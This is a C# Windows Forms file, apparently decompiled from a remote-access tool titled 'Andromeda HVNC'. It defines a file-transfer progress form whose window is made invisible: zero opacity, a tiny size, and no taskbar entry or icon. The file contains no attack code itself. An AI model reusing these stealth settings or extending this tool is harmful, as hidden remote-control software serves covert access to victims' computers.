using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
	public class FrmTransfer : Form
	{
		public int int_0;

		private IContainer components;

		private ProgressBar DuplicateProgess;

		private Label FileTransferLabel;

		private Label PingTransform;

		public ProgressBar DuplicateProgesse
		{
			get
			{
				return DuplicateProgess;
			}
			set
			{
				DuplicateProgess = value;
			}
		}

		public Label FileTransferLabele
		{
			get
			{
				return FileTransferLabel;
			}
			set
			{
				FileTransferLabel = value;
			}
		}

		public Label PingTransfor
		{
			get
			{
				return PingTransform;
			}
			set
			{
				PingTransform = value;
			}
		}

		public FrmTransfer()
		{
			int_0 = 0;
			InitializeComponent();
		}

		private void FrmTransfer_Load(object sender, EventArgs e)
		{
		}

		public void DuplicateProfile(int int_1)
		{
			if (int_1 > int_0)
			{
				int_1 = int_0;
			}
			FileTransferLabel.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(int_0) + " MB";
			DuplicateProgess.Value = int_1;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmTransfer));
            this.DuplicateProgess = new System.Windows.Forms.ProgressBar();
            this.FileTransferLabel = new System.Windows.Forms.Label();
            this.PingTransform = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // DuplicateProgess
            // 
            this.DuplicateProgess.Location = new System.Drawing.Point(12, 12);
            this.DuplicateProgess.Name = "DuplicateProgess";
            this.DuplicateProgess.Size = new System.Drawing.Size(453, 23);
            this.DuplicateProgess.TabIndex = 1;
            // 
            // FileTransferLabel
            // 
            this.FileTransferLabel.AutoSize = true;
            this.FileTransferLabel.Location = new System.Drawing.Point(225, 44);
            this.FileTransferLabel.Name = "FileTransferLabel";
            this.FileTransferLabel.Size = new System.Drawing.Size(37, 13);
            this.FileTransferLabel.TabIndex = 4;
            this.FileTransferLabel.Text = "Status";
            // 
            // PingTransform
            // 
            this.PingTransform.AutoSize = true;
            this.PingTransform.Location = new System.Drawing.Point(255, 44);
            this.PingTransform.Name = "PingTransform";
            this.PingTransform.Size = new System.Drawing.Size(95, 13);
            this.PingTransform.TabIndex = 5;
            this.PingTransform.Text = "Ping: Measuring....";
            this.PingTransform.Visible = false;
            // 
            // FrmTransfer
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(10, 10);
            this.Controls.Add(this.FileTransferLabel);
            this.Controls.Add(this.DuplicateProgess);
            this.Controls.Add(this.PingTransform);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "FrmTransfer";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Andromeda HVNC";
            this.Load += new System.EventHandler(this.FrmTransfer_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

		}
	}
}
